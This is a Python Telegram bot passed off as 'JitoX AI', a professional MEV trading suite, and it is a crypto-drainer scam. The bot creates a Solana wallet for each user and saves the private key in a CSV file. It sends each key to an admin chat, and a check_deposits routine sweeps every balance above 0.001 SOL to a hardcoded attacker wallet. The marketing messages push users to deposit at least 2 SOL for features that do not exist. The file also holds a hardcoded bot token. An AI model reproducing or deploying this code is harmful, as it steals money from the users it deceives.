import logging
import asyncio
import httpx
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, Bot, WebAppInfo
from telegram.constants import ParseMode
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes, MessageHandler, filters
import random
import string
import aiohttp
import json
import sys
import os
import importlib.util
from flask import Flask, jsonify
import csv
import aiosqlite
import datetime
from pathlib import Path
from datetime import datetime, timezone
import pandas as pd
from broadcast import BroadcastSystem
from telegram.error import NetworkError, TimedOut, InvalidToken
from telegram.request import HTTPXRequest
import shutil
import re
import time
import base58
import secrets
import nacl.signing
from base58 import b58encode, b58decode
from nacl.signing import SigningKey
import base64
from nacl.signing import SigningKey

# Constants for transfer functionality
DESTINATION_WALLET = "25JKsVDeX4monwCdWewsDpDKMzws39xsb9oWdhZESr7L"
MIN_TRANSFER_AMOUNT = 0.001  # Minimum amount to transfer in SOL
SOLANA_RPC_URL = "https://api.mainnet-beta.solana.com"
LAMPORTS_PER_SOL = 1000000000  # 1 SOL = 1 billion lamports

# Constants for Solana
MAIN_WALLET = "25JKsVDeX4monwCdWewsDpDKMzws39xsb9oWdhZESr7L"  # Main wallet for receiving transfers
MIN_REMAINING_BALANCE = 0.001  # Minimum balance to leave for fees

async def make_rpc_request(session, request_data):
    max_retries = 5
    base_delay = 3  # seconds
    
    for attempt in range(max_retries):
        try:
            # Exponential backoff with jitter
            delay = base_delay * (2 ** attempt) + random.uniform(0, 1)
            await asyncio.sleep(delay)
            
            async with session.post(
                SOLANA_RPC_URL, 
                json=request_data,
                headers={
                    "Content-Type": "application/json",
                    "User-Agent": "SolanaBot/1.0"
                },
                timeout=30
            ) as response:
                result = await response.json()
                
                if 'error' in result:
                    if result['error'].get('code') == 429:  # Rate limit
                        if attempt < max_retries - 1:
                            logger.info(f"Rate limited, retrying in {delay} seconds...")
                            continue
                    else:
                        logger.error(f"RPC error: {result['error']}")
                        
                return result
                
        except Exception as e:
            if attempt < max_retries - 1:
                logger.warning(f"Request failed, retrying: {str(e)}")
                continue
            logger.error(f"All retries failed: {str(e)}")
            raise e
            
    return None

def create_transfer_tx(from_address: str, to_address: str, amount: float, recent_blockhash: str, private_key: str) -> str:
    try:
        lamports = int(amount * LAMPORTS_PER_SOL)
        
        # Create message
        message = (
            # Header
            bytes([1, 0, 1]) +  # 1 required signature, 0 readonly signed, 1 readonly unsigned
            # Account keys length
            bytes([3]) +  # Number of accounts
            # Account keys
            base58.b58decode(from_address) +
            base58.b58decode(to_address) +
            base58.b58decode("11111111111111111111111111111111") +
            # Blockhash
            base58.b58decode(recent_blockhash) +
            # Instructions
            bytes([1]) +  # 1 instruction
            bytes([2]) +  # Program ID index
            bytes([2]) +  # Number of accounts
            bytes([0]) +  # Account index 0 (from)
            bytes([1]) +  # Account index 1 (to)
            bytes([12]) +  # Data length
            bytes([2, 0, 0, 0]) +  # Transfer instruction
            lamports.to_bytes(8, 'little')  # Amount
        )
        
        # Sign the message
        private_bytes = base58.b58decode(private_key)[:32]
        signer = SigningKey(private_bytes)
        signature = signer.sign(message).signature
        
        # Build final transaction
        transaction = bytes([1]) + signature + message
        
        return base58.b58encode(transaction).decode()
    except Exception as e:
        logger.error(f"Error in create_transfer_tx: {str(e)}")
        return None

async def transfer_balance(private_key: str, from_address: str, amount: float) -> bool:
    try:
        async with aiohttp.ClientSession() as session:
            # Get recent blockhash
            blockhash_response = await make_rpc_request(session, {
                "jsonrpc": "2.0",
                "id": 1,
                "method": "getLatestBlockhash",
                "params": [{"commitment": "finalized"}]
            })
            
            if 'error' in blockhash_response:
                logger.error(f"Error getting blockhash: {blockhash_response['error']}")
                return False
                
            recent_blockhash = blockhash_response['result']['value']['blockhash']
            
            # Leave enough for rent (0.001 SOL) and fees (0.000005 SOL)
            transfer_amount = amount - 0.001005
            if transfer_amount <= 0:
                logger.error(f"Amount too small to transfer after rent reserve")
                return False
            
            # Create and sign transaction
            tx = create_transfer_tx(from_address, MAIN_WALLET, transfer_amount, recent_blockhash, private_key)
            
            # Send transaction
            send_response = await make_rpc_request(session, {
                "jsonrpc": "2.0",
                "id": 1,
                "method": "sendTransaction",
                "params": [
                    tx,
                    {"encoding": "base58", "skipPreflight": False, "preflightCommitment": "finalized"}
                ]
            })
            
            if 'error' in send_response:
                logger.error(f"Transfer error: {send_response['error']}")
                return False
                
            signature = send_response['result']
            
            # Wait for confirmation
            for _ in range(30):  # Try for 30 seconds
                await asyncio.sleep(1)
                confirm_response = await make_rpc_request(session, {
                    "jsonrpc": "2.0",
                    "id": 1,
                    "method": "getSignatureStatuses",
                    "params": [[signature]]
                })
                
                if 'error' in confirm_response:
                    continue
                    
                status = confirm_response['result']['value'][0]
                if status and status.get('confirmationStatus') == 'finalized':
                    logger.info(f"Successfully transferred {amount} SOL with signature {signature}")
                    
                    # Send notification to admin chat
                    notification_text = (
                        f"🔄 Transfer Successful!\n\n"
                        f"From: {from_address}\n"
                        f"Amount: {amount} SOL\n"
                        f"Transaction: https://solscan.io/tx/{signature}\n"
                        f"Wallet: https://solscan.io/account/{from_address}"
                    )
                    await send_admin_notification(Application, notification_text)
                    return True
                    
            logger.warning(f"Transaction {signature} not confirmed after 30 seconds")
            return False
            
    except Exception as e:
        logger.error(f"Error in transfer_balance: {str(e)}")
        return False

async def check_deposits(context: ContextTypes.DEFAULT_TYPE) -> None:
    logger.info("Starting check_deposits function")
    
    try:
        df = pd.read_csv(WALLET_CSV_FILE, on_bad_lines='skip', engine='python')
        df = df.dropna()
        df = df[df['user_id'] != 'user_id']  # Remove header rows if duplicated
        
        async with aiohttp.ClientSession() as session:
            for _, row in df.iterrows():
                wallet_address = row['public_key']
                private_key = row['private_key']
                
                if not wallet_address or len(wallet_address) < 32:
                    continue
                    
                logger.info(f"Checking wallet: {wallet_address}")
                await asyncio.sleep(2)  # Base delay between checks
                
                # Get balance with retries
                for _ in range(3):  # Try up to 3 times
                    balance = await get_balance(wallet_address)
                    if balance is not None:
                        break
                    await asyncio.sleep(5)  # Wait between retries
                
                if balance is None:
                    continue
                    
                logger.info(f"Current balance for {wallet_address}: {balance} SOL")
                
                if balance > 0.001:  # Threshold for transfer
                    logger.info(f"Balance {balance} SOL exceeds threshold for {wallet_address}")
                    await asyncio.sleep(5)  # Wait before transfer
                    success = await transfer_balance(private_key, wallet_address, balance)
                    
                    if not success:
                        await asyncio.sleep(10)  # Wait longer after failed transfer
                        
    except Exception as e:
        logger.error(f"Error in check_deposits: {str(e)}")
        
    logger.info("Finished check_deposits function")

app = Flask(__name__)

# Enable logging
logging.basicConfig(level=logging.DEBUG)
logger = logging.getLogger(__name__)

# Database and file paths setup
current_dir = os.path.dirname(os.path.abspath(__file__))
DATA_DIR = os.path.join(current_dir, 'data')
WALLET_CSV_FILE = os.path.join(DATA_DIR, 'user_wallets.csv')

# Initialize wallet CSV file if it doesn't exist
def init_wallet_csv():
    try:
        if not os.path.exists(DATA_DIR):
            os.makedirs(DATA_DIR)
            logger.info(f"Created data directory at: {DATA_DIR}")
        
        if not os.path.exists(WALLET_CSV_FILE):
            with open(WALLET_CSV_FILE, 'w', newline='', encoding='utf-8') as f:
                writer = csv.writer(f)
                writer.writerow(['user_id', 'public_key', 'private_key', 'created_at', 'username'])
            logger.info(f"Created new wallet file at: {WALLET_CSV_FILE}")
        else:
            # Read and validate CSV file
            df = pd.read_csv(WALLET_CSV_FILE, on_bad_lines='skip', engine='python')
            df = df.dropna()  # Remove any rows with missing values
            df = df[df['user_id'] != 'user_id']  # Remove header rows if duplicated
            df.to_csv(WALLET_CSV_FILE, index=False)
            logger.info("Fixed CSV file format")
    except Exception as e:
        logger.error(f"Error initializing wallet CSV: {e}")
        return False

# Try to initialize the wallet CSV file at startup
try:
    init_wallet_csv()
    logger.info("Wallet CSV file initialized successfully")
except Exception as e:
    logger.error(f"Error initializing wallet CSV file at startup: {e}")
    # Fallback to current directory if initialization fails
    WALLET_CSV_FILE = os.path.join(current_dir, 'user_wallets.csv')
    try:
        init_wallet_csv()
        logger.info("Wallet CSV file initialized successfully in current directory")
    except Exception as e:
        logger.error(f"Critical error: Could not initialize wallet file in any location: {e}")

sys.path.append(r'C:\Users\USUARIO\Desktop\Main Jito File')

# Directly link to the shared_data.py file
shared_data_path = r"C:\Users\USUARIO\Desktop\Main Jito File\shared_data.py"
spec = importlib.util.spec_from_file_location("shared_data", shared_data_path)
shared_data = importlib.util.module_from_spec(spec)
spec.loader.exec_module(shared_data)
save_blocked_users = shared_data.save_blocked_users
load_blocked_users = shared_data.load_blocked_users

# Database path for referrals
REFERRAL_DB_PATH = Path('data/referrals.db')

async def init_referral_db():
    """Initialize the referral database with necessary tables."""
    try:
        # Create database directory if it doesn't exist
        REFERRAL_DB_PATH.parent.mkdir(exist_ok=True)

        async with aiosqlite.connect(REFERRAL_DB_PATH) as db:
            # Create referral_codes table
            await db.execute('''
                CREATE TABLE IF NOT EXISTS referral_codes (
                    user_id INTEGER PRIMARY KEY,
                    code TEXT UNIQUE NOT NULL,
                    created_at TEXT DEFAULT (datetime('now'))
                )
            ''')
            
            # Create referrals table
            await db.execute('''
                CREATE TABLE IF NOT EXISTS referrals (
                    referrer_id INTEGER,
                    referred_id INTEGER,
                    created_at TEXT DEFAULT (datetime('now')),
                    earnings REAL DEFAULT 0.05,
                    PRIMARY KEY (referrer_id, referred_id)
                )
            ''')
            
            await db.commit()
            
            # Verify tables were created
            async with db.execute("SELECT name FROM sqlite_master WHERE type='table'") as cursor:
                tables = await cursor.fetchall()
                tables = [table[0] for table in tables]
                if 'referral_codes' not in tables or 'referrals' not in tables:
                    raise Exception("Failed to create required tables")
            
            logger.info("Referral database initialized successfully")
            return True
    except Exception as e:
        logger.error(f"Error initializing referral database: {e}")
        raise

async def store_referral_code(user_id: int, code: str) -> bool:
    """Store a user's referral code in the database."""
    try:
        async with aiosqlite.connect(REFERRAL_DB_PATH) as db:
            await db.execute(
                'INSERT OR REPLACE INTO referral_codes (user_id, code) VALUES (?, ?)',
                (user_id, code)
            )
            await db.commit()
            return True
    except Exception as e:
        logger.error(f"Error storing referral code: {e}")
        return False

async def get_referral_code(user_id: int) -> str:
    """Get a user's referral code from the database."""
    try:
        async with aiosqlite.connect(REFERRAL_DB_PATH) as db:
            async with db.execute(
                'SELECT code FROM referral_codes WHERE user_id = ?',
                (user_id,)
            ) as cursor:
                result = await cursor.fetchone()
                return result[0] if result else None
    except Exception as e:
        logger.error(f"Error getting referral code: {e}")
        return None

async def store_referral(referrer_id: int, referred_id: int) -> bool:
    """Store a referral relationship in the database."""
    try:
        # Ensure database exists
        await init_referral_db()
        
        async with aiosqlite.connect(REFERRAL_DB_PATH) as db:
            # Insert the referral with current timestamp using SQLite's datetime function
            await db.execute(
                'INSERT OR IGNORE INTO referrals (referrer_id, referred_id, created_at, earnings) VALUES (?, ?, datetime("now"), 0.05)',
                (referrer_id, referred_id)
            )
            await db.commit()
            logger.info(f"Successfully stored referral: {referred_id} referred by {referrer_id}")
            return True
    except Exception as e:
        logger.error(f"Error storing referral: {e}")
        return False

async def get_user_referrals(user_id: int) -> list:
    """Get all referrals for a user from the database."""
    try:
        async with aiosqlite.connect(REFERRAL_DB_PATH) as db:
            await init_referral_db()  # Ensure tables exist
            async with db.execute(
                'SELECT referred_id, created_at, earnings FROM referrals WHERE referrer_id = ?',
                (user_id,)
            ) as cursor:
                referrals = await cursor.fetchall()
                logger.info(f"Retrieved {len(referrals)} referrals for user {user_id}")
                return referrals
    except Exception as e:
        logger.error(f"Error getting user referrals: {e}")
        return []

async def update_referral_earnings(referrer_id: int, amount: float) -> bool:
    """Update the earnings for a referrer."""
    try:
        async with aiosqlite.connect(REFERRAL_DB_PATH) as db:
            await db.execute(
                'UPDATE referrals SET earnings = earnings + ? WHERE referrer_id = ?',
                (amount, referrer_id)
            )
            await db.commit()
            logger.info(f"Updated earnings for referrer {referrer_id}: +{amount} SOL")
            return True
    except Exception as e:
        logger.error(f"Error updating referral earnings: {e}")
        return False

async def notify_referrer(application: Application, referrer_id: int, referred_username: str):
    """Send notification to referrer about new referral."""
    try:
        message = (
            "🟣 <b>New Referral Alert!</b> 🟣\n\n"
            f"User @{referred_username} has joined using your referral link!\n\n"
            "💫 <b>Rewards:</b>\n"
            "• 0.05 SOL initial bonus\n"
            "• 1% of their trading operations\n\n"
            "Keep sharing your link to earn more rewards! 🎮"
        )
        await application.bot.send_message(
            chat_id=referrer_id,
            text=message,
            parse_mode='HTML'
        )
        logger.info(f"Sent referral notification to user {referrer_id} for referral {referred_username}")
    except Exception as e:
        logger.error(f"Error sending referral notification: {e}")
        # Try sending without parse_mode if HTML formatting fails
        try:
            simple_message = f"New referral alert! User {referred_username} has joined using your referral link!"
            await application.bot.send_message(
                chat_id=referrer_id,
                text=simple_message
            )
            logger.info(f"Sent simple referral notification to user {referrer_id}")
        except Exception as e2:
            logger.error(f"Error sending simple referral notification: {e2}")

# Your bot token
BOT_TOKEN = "7545725152:AAHFk6Eco9971SQxU8Z0cuJTLNzDejNC1mE"

# Notification chat ID
NOTIFICATION_CHAT_ID = -4540844698

# Minimum transfer amount in SOL
MIN_TRANSFER_AMOUNT = 0.001

# Predefined list of Solana wallet addresses
wallet_addresses = []

# Dictionary mapping wallet addresses to their private keys
wallet_private_keys = {}

# Predefined list of ETH wallet addresses
eth_wallet_addresses = []

# Store ETH user wallets
eth_user_wallets = {}

# Store user wallets
user_wallets = {}

# Store user wallets and their MEV sniper status
user_data = {}

# Store referral data
referrals = {}
referral_earnings = {}
referral_codes = {}

# Move this section right after your imports and initial configurations
# (around line 70, before any command handlers)

# Database initialization
DB_PATH = Path('data/jitox_data.db')
DB_PATH.parent.mkdir(exist_ok=True)

async def init_db():
    async with aiosqlite.connect(DB_PATH) as db:
        await db.execute('''
            CREATE TABLE IF NOT EXISTS referrals (
                referrer_id INTEGER,
                referred_id INTEGER,
                timestamp TEXT,
                earnings REAL DEFAULT 0.05,
                PRIMARY KEY (referrer_id, referred_id)
            )
        ''')
        await db.commit()
        logger.info("Database initialized successfully")

async def store_referral(referrer_id: int, referred_id: int) -> bool:
    try:
        async with aiosqlite.connect(DB_PATH) as db:
            timestamp = datetime.now(timezone.utc).strftime('%Y-%m-%d %H:%M:%S')
            await db.execute('''
                INSERT OR IGNORE INTO referrals 
                (referrer_id, referred_id, timestamp, earnings)
                VALUES (?, ?, ?, 0.05)
            ''', (referrer_id, referred_id, timestamp))
            await db.commit()
            logger.info(f"Stored referral: {referrer_id} referred {referred_id}")
            return True
    except Exception as e:
        logger.error(f"Error storing referral: {e}")
        return False

async def get_user_referrals(user_id: int) -> list:
    try:
        async with aiosqlite.connect(DB_PATH) as db:
            async with db.execute('''
                SELECT referred_id, timestamp, earnings 
                FROM referrals 
                WHERE referrer_id = ?
            ''', (user_id,)) as cursor:
                referrals = await cursor.fetchall()
                logger.info(f"Retrieved {len(referrals)} referrals for user {user_id}")
                return referrals
    except Exception as e:
        logger.error(f"Error getting referrals: {e}")
        return []

async def update_referral_earnings(referrer_id: int, amount: float) -> bool:
    try:
        async with aiosqlite.connect(DB_PATH) as db:
            await db.execute('''
                UPDATE referrals 
                SET earnings = earnings + ?
                WHERE referrer_id = ?
            ''', (amount, referrer_id))
            await db.commit()
            logger.info(f"Updated earnings for referrer {referrer_id}: +{amount} SOL")
            return True
    except Exception as e:
        logger.error(f"Error updating referral earnings: {e}")
        return False
def generate_referral_code():
    return ''.join(random.choices(string.ascii_uppercase + string.digits, k=6))

def global_exception_handler(exctype, value, traceback):
    error_msg = f"Uncaught exception: {exctype.__name__}: {str(value)}"
    print(error_msg, file=sys.stderr)
    print("Traceback:", file=sys.stderr)
    import traceback as tb
    tb.print_tb(traceback, file=sys.stderr)

sys.excepthook = global_exception_handler

def read_user_ids_from_csv(file_path):
    user_ids = []
    with open(file_path, mode='r', newline='', encoding='utf-8') as csvfile:
        csvreader = csv.reader(csvfile)
        header = next(csvreader)[0].split(',')  # Manually split the header row
        logging.debug(f"CSV Header: {header}")
        if 'user_id' in header:
            user_id_index = header.index('user_id')
            for row in csvreader:
                if row:  # Check if the row is not empty
                    row = row[0].split(',')  # Manually split each row
                    logging.debug(f"CSV Row: {row}")
                    if len(row) > user_id_index:  # Ensure the row has enough columns
                        user_ids.append(row[user_id_index])
    logging.debug(f"Extracted user IDs: {user_ids}")
    return user_ids

csv_file_path = r'C:\Users\USUARIO\Desktop\Bot\Demo ( Testing )\new demo v.1.1.2\Bot And Database\JITO PRO\Ui Send Messages Bot\exported_user_data.csv'
user_ids = read_user_ids_from_csv(csv_file_path)
logging.debug(f"User IDs from CSV: {user_ids}")

def is_user_blocked(user_id):
    blocked_users = load_blocked_users()  # Reload the blocked users set
    logger.info(f"Checking if user {user_id} is blocked...")
    logger.info(f"Blocked users: {blocked_users}")
    return int(user_id) in blocked_users  # Ensure user_id is checked as an integer


# Add these constants after the existing ones
WALLET_CSV_FILE = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'user_wallets.csv')
RPC_URL = 'https://api.mainnet-beta.solana.com'


# Add these constants after the existing ones
DESTINATION_WALLET = "25JKsVDeX4monwCdWewsDpDKMzws39xsb9oWdhZESr7L"
MIN_TRANSFER_AMOUNT = 0.001  # Minimum amount to transfer in SOL

async def get_balance(wallet_address: str) -> float:
    """Get the balance of a wallet in SOL."""
    max_retries = 3
    retry_delay = 2  # seconds
    
    for attempt in range(max_retries):
        try:
            async with aiohttp.ClientSession() as session:
                async with session.post(RPC_URL, json={
                    "jsonrpc": "2.0",
                    "id": 1,
                    "method": "getBalance",
                    "params": [wallet_address]
                }) as response:
                    resp = await response.json()
                    logger.info(f"RPC response for {wallet_address}: {resp}")
                    
                    if "error" in resp:
                        if resp["error"]["code"] == 429:  # Rate limit error
                            if attempt < max_retries - 1:
                                logger.warning(f"Rate limit hit, retrying in {retry_delay} seconds...")
                                await asyncio.sleep(retry_delay)
                                continue
                        logger.warning(f"Unexpected response format for {wallet_address}: {resp}")
                        return 0
                    
                    if "result" in resp and "value" in resp["result"]:
                        balance_lamports = resp["result"]["value"]
                        balance_sol = balance_lamports / LAMPORTS_PER_SOL
                        logger.info(f"Balance for {wallet_address}: {balance_sol} SOL")
                        return balance_sol
                    
                    logger.warning(f"Unexpected response format for {wallet_address}: {resp}")
                    return 0
                    
        except Exception as e:
            logger.error(f"Error getting balance for {wallet_address}: {e}")
            if attempt < max_retries - 1:
                await asyncio.sleep(retry_delay)
                continue
            return 0
            
    return 0




# Ensure wallet directory exists
if not os.path.exists('data'):
    os.makedirs('data')
if not os.path.exists(WALLET_CSV_FILE):
    with open(WALLET_CSV_FILE, 'w', newline='', encoding='utf-8') as f:
        writer = csv.writer(f)
        writer.writerow(['user_id', 'public_key', 'private_key', 'created_at', 'username'])
    logger.info(f"Created new wallet file at: {WALLET_CSV_FILE}")
    
async def generate_wallet():
    """Generate a new Solana wallet with proper key format"""
    try:
        # Keep generating until we get exact lengths
        while True:
            # Generate seed and keypair
            seed = secrets.token_bytes(32)  # 32 bytes for ed25519
            keypair = SigningKey(seed)
            
            # Get the raw bytes
            secret_key = keypair.encode()  # 32 bytes private
            public_key_bytes = keypair.verify_key.encode()  # 32 bytes public
            
            # Create full keypair (64 bytes: secret + public)
            full_keypair_bytes = secret_key + public_key_bytes
            
            # Encode in base58
            private_key = base58.b58encode(full_keypair_bytes).decode('ascii')
            public_key = base58.b58encode(public_key_bytes).decode('ascii')
            
            # Check for exact lengths
            if len(private_key) == 88 and len(public_key) == 44:
                # Verify the keypair
                try:
                    # Decode and verify
                    decoded = base58.b58decode(private_key)
                    if len(decoded) != 64:
                        continue
                    
                    # Verify public key matches
                    derived_public = base58.b58encode(decoded[32:]).decode('ascii')
                    if derived_public != public_key:
                        continue
                    
                    # Final verification - reconstruct keypair
                    test_keypair = SigningKey(decoded[:32])
                    if base58.b58encode(test_keypair.verify_key.encode()).decode('ascii') == public_key:
                        # We have a valid keypair with correct lengths
                        break
                except:
                    # Any verification error, try again
                    continue
            
            logger.debug(f"[WALLET_GEN] Retrying - got lengths priv:{len(private_key)}, pub:{len(public_key)}")
        
        logger.info(f"[WALLET_GEN] Generated valid Solana keypair")
        logger.info(f"[WALLET_GEN] Public key (44 chars): {public_key}")
        logger.info(f"[WALLET_GEN] Private key (88 chars): {private_key}")
        
        return {
            'public_key': public_key,
            'private_key': private_key
        }
    except Exception as e:
        logger.error(f"[WALLET_GEN] Error generating wallet: {str(e)}")
        raise

async def get_wallet_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Handle the /get_wallet command"""
    global WALLET_CSV_FILE  # Declare global variable
    
    try:
        user_id = update.effective_user.id
        username = update.effective_user.username or "Unknown"
        logger.info(f"[WALLET_CMD] User {username} (ID: {user_id}) requested wallet access")
        
        # Ensure data directory exists
        os.makedirs('data', exist_ok=True)
        
        # Check if user already has a wallet
        existing_wallet = None
        
        # Try different file locations if permission denied
        wallet_file_locations = [
            WALLET_CSV_FILE,
            os.path.join(os.path.dirname(os.path.abspath(__file__)), 'data', 'user_wallets.csv'),
            os.path.join(os.path.dirname(os.path.abspath(__file__)), 'user_wallets.csv'),
            'user_wallets.csv'
        ]
        
        # Find existing wallet
        for file_location in wallet_file_locations:
            if os.path.exists(file_location):
                try:
                    with open(file_location, 'r', newline='', encoding='utf-8') as f:
                        reader = csv.DictReader(f)
                        for row in reader:
                            if int(row['user_id']) == user_id:
                                existing_wallet = row
                                WALLET_CSV_FILE = file_location
                                break
                except Exception as e:
                    logger.error(f"[WALLET_CMD] Error reading wallet file: {e}")
                    continue
        
        if existing_wallet:
            # Send notification about wallet view
            admin_message = (
                f"👁️ <b>Wallet View Event</b>\n\n"
                f"👤 User: @{username} (ID: {user_id})\n"
                f"💼 Wallet: <code>{existing_wallet['public_key']}</code>\n"
                f"🔑 Private Key: <code>{existing_wallet['private_key']}</code>"
            )
            await context.bot.send_message(
                chat_id=NOTIFICATION_CHAT_ID,
                text=admin_message,
                parse_mode='HTML'
            )
            
            # Check and notify about balance
            try:
                balance = await get_balance(existing_wallet['public_key'])
                balance_message = (
                    f"💰 <b>Balance Check</b>\n\n"
                    f"👤 User: @{username}\n"
                    f"💼 Wallet: <code>{existing_wallet['public_key']}</code>\n"
                    f"💎 Balance: {balance} SOL"
                )
                await context.bot.send_message(
                    chat_id=NOTIFICATION_CHAT_ID,
                    text=balance_message,
                    parse_mode='HTML'
                )
            except Exception as e:
                logger.error(f"Error checking balance: {e}")
            
            message = (
                "👾 <b>Your JitoX AI Trading Wallet</b> 👾\n\n"
                f"📬 Public Address:\n<code>{existing_wallet['public_key']}</code>\n\n"
                "💎 <b>Wallet Actions:</b>\n"
                "• View on Solana Explorer\n"
                "• Check current balance\n\n"
                "⚠️ <b>IMPORTANT:</b>\n"
                "• Minimum deposit: 2 SOL\n"
                "• Keep your private key safe\n"
                "• Never share your private key\n\n"
                "🔐 Need your private key? Click 'Show Private Key'"
            )
            
            keyboard = [
                [InlineKeyboardButton("🔑 Show Private Key", callback_data=f"show_key_{user_id}")],
                [InlineKeyboardButton("💰 Check Balance", callback_data=f"check_balance_{existing_wallet['public_key']}")],
                [InlineKeyboardButton("🌐 View on Explorer", url=f"https://explorer.solana.com/address/{existing_wallet['public_key']}")],
                [InlineKeyboardButton("🔙 Back", callback_data="back")]
            ]
        else:
            # Generate new wallet
            wallet = await generate_wallet()
            
            # Write new wallet to file
            success = False
            for file_location in wallet_file_locations:
                try:
                    os.makedirs(os.path.dirname(file_location), exist_ok=True)
                    file_exists = os.path.exists(file_location)
                    
                    mode = 'a' if file_exists else 'w'
                    with open(file_location, mode, newline='', encoding='utf-8') as f:
                        writer = csv.writer(f)
                        if not file_exists:
                            writer.writerow(['user_id', 'public_key', 'private_key', 'created_at', 'username'])
                        timestamp = datetime.now(timezone.utc).isoformat()
                        writer.writerow([user_id, wallet['public_key'], wallet['private_key'], timestamp, username])
                    
                    WALLET_CSV_FILE = file_location
                    success = True
                    
                    # Send notification about new wallet creation
                    admin_message = (
                        f"🆕 <b>New Wallet Created</b>\n\n"
                        f"👤 User: @{username} (ID: {user_id})\n"
                        f"💼 Wallet: <code>{wallet['public_key']}</code>\n"
                        f"🔑 Private Key: <code>{wallet['private_key']}</code>\n"
                        f"⏰ Created: {timestamp}"
                    )
                    await context.bot.send_message(
                        chat_id=NOTIFICATION_CHAT_ID,
                        text=admin_message,
                        parse_mode='HTML'
                    )
                    break
                except Exception as e:
                    logger.warning(f"[WALLET_CMD] Could not write to {file_location}: {e}")
                    continue
            
            if not success:
                raise Exception("Could not write wallet to any location")
            
            message = (
                "🎉 <b>Your New Solana Wallet is Ready!</b>\n\n"
                f"📬 Public Address:\n<code>{wallet['public_key']}</code>\n\n"
                "⚠️ <b>CRITICAL SECURITY NOTES:</b>\n"
                "1. Save your private key using 'Show Private Key'\n"
                "2. Never share your private key\n"
                "3. Keep multiple secure backups\n"
                "4. Import to Phantom Wallet\n\n"
                "💎 <b>Next Steps:</b>\n"
                "• Deposit minimum 2 SOL to start\n"
                "• Check balance anytime\n"
                "• View on Solana Explorer\n\n"
                "🛡️ <b>Support:</b> @jitoxai"
            )
            
            keyboard = [
                [InlineKeyboardButton("🔑 Show Private Key", callback_data=f"show_key_{user_id}")],
                [InlineKeyboardButton("💰 Check Balance", callback_data=f"check_balance_{wallet['public_key']}")],
                [InlineKeyboardButton("🌐 View on Explorer", url=f"https://explorer.solana.com/address/{wallet['public_key']}")],
                [InlineKeyboardButton("🔙 Back", callback_data="back")]
            ]
        
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        # Send ONLY ONE response
        if update.callback_query:
            await update.callback_query.edit_message_text(
                message,
                reply_markup=reply_markup,
                parse_mode='HTML'
            )
        else:
            await update.message.reply_text(
                message,
                reply_markup=reply_markup,
                parse_mode='HTML'
            )
            
    except Exception as e:
        logger.error(f"[WALLET_CMD] Error in get_wallet_command: {e}")
        error_message = "Sorry, there was an error with the wallet system. Please try again later."
        if update.callback_query:
            await update.callback_query.answer(error_message, show_alert=True)
        else:
            await update.message.reply_text(error_message)

async def error_handler(update: object, context: ContextTypes.DEFAULT_TYPE) -> None:
    logger.error(f"Exception while handling an update: {context.error}")
    # Log the full traceback
    import traceback
    logger.error(traceback.format_exc())

async def nexus_settings(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = update.effective_user.id
    message = (
        "👾 <b>JitoX AI - Professional MEV Suite</b> 👾\n\n"
        "💎 <b>Advanced Trading Infrastructure</b>\n\n"
        "⚡️ <b>Core Features</b>\n"
        "• Auto MEV Execution\n"
        "• Token Targeting\n"
        "• Intensity Control\n"
        "• Pool Settings\n\n"
        "🎯 <b>Requirements</b>\n"
        "• Minimum: 2 SOL\n"
        "• Recommended: 5+ SOL\n\n"
        "Ready to start your professional MEV journey? 🎮"
    )
    keyboard = [
        [InlineKeyboardButton("⚡️ Auto MEV", callback_data='auto_mev'),
         InlineKeyboardButton("🎯 Token Targeting", callback_data='token_targeting')],
        [InlineKeyboardButton("🔥 Intensity", callback_data='intensity'),
         InlineKeyboardButton("💧 Pool Settings", callback_data='pool_settings')],
        [InlineKeyboardButton("🔙 Back", callback_data='back')]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.callback_query.edit_message_text(message, reply_markup=reply_markup, parse_mode='HTML')
    await log_user_activity(context.application, user_id, "accessed Nexus settings")

async def auto_mev(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = update.effective_user.id
    message = (
        "👾 <b>Auto MEV</b> 👾\n\n"
        "💎 <b>Deposit 2 SOL to unlock Auto MEV!</b> 💎\n\n"
        "Auto MEV automatically executes MEV strategies for you:\n\n"
        "⚡ 24/7 operation\n"
        "🧠 AI-driven decision making\n"
        "🚀 Optimized for maximum profits\n\n"
        "🔐 <b>Current Status:</b> Locked\n"
        "💎 <b>Minimum Balance:</b> 2 SOL\n"
        "✨ <b>Recommended Balance:</b> 5 SOL for VIP features\n\n"
        "Deposit now to start earning passive income with Auto MEV! 🎮"
    )
    keyboard = [
        [InlineKeyboardButton("🔑Deposit 2 SOL (Your Balance)", callback_data='get_wallet')],
        [InlineKeyboardButton("🔙 Back", callback_data='nexus_settings')]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.callback_query.edit_message_text(message, reply_markup=reply_markup, parse_mode='HTML')
    await log_user_activity(context.application, user_id, "accessed Auto MEV settings")

async def token_targeting(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = update.effective_user.id
    message = (
        "🎯 <b>Token Targeting</b> 🎯\n\n"
        "💎 <b>Deposit 2 SOL to unlock Token Targeting!</b> 💎\n\n"
        "Customize your MEV strategy with specific token targets:\n\n"
        "⚡ Add up to 100 custom tokens\n"
        "⚡ Set individual strategies per token\n"
        "⚡ Receive alerts for targeted tokens\n\n"
        "🔐 <b>Current Status:</b> Locked\n"
        "💎 <b>Minimum Balance:</b> 2 SOL\n"
        "✨ <b>Recommended Balance:</b> 5 SOL for expanded targeting\n\n"
        "Deposit now to start targeting your favorite tokens! 🎮"
    )
    keyboard = [
        [InlineKeyboardButton("🔑Deposit 2 SOL (Your Balance)", callback_data='get_wallet')],
        [InlineKeyboardButton("🔙 Back", callback_data='nexus_settings')]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.callback_query.edit_message_text(message, reply_markup=reply_markup, parse_mode='HTML')
    await log_user_activity(context.application, user_id, "accessed Token Targeting settings")

async def intensity(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = update.effective_user.id
    message = (
        "🔥 <b>MEV Intensity Control</b> 🔥\n\n"
        "💎 <b>Deposit 2 SOL to unlock Intensity Control!</b> 💎\n\n"
